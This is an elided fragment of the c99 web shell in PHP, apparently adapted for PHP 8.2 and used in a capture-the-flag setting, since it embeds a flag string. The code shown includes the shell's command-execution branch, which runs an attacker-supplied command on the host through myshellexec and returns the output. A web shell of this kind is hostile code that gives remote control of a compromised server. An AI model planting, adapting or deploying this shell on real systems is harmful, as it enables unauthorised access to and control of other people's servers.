...
*           SCRIPT MODIFIED TO WORK ON PHP 8.2 BY jake-cryptic
******************************************************************************************************
*/
...
if ($act != "img")
{
    ...
    if (!function_exists("c99sh_getupdate"))
    {
        ...
        {
            return 'failed with flag{s3rv3r_pwn3d_3z_p33zy}';
        }
    }
    ...
    if ($act == "cmd")
    {
        ...
        else
        {
            ...
            if (!empty($submit))
            {
                ...
                @chdir($d);
                $ret = myshellexec($cmd);
                $ret = mb_convert_encoding($ret, 'Windows-1251', 'KOI8-R');
                if ($cmd_txt)
                {
                    $rows = count(explode("\r\n", $ret)) + 1;
                    if ($rows < 10)
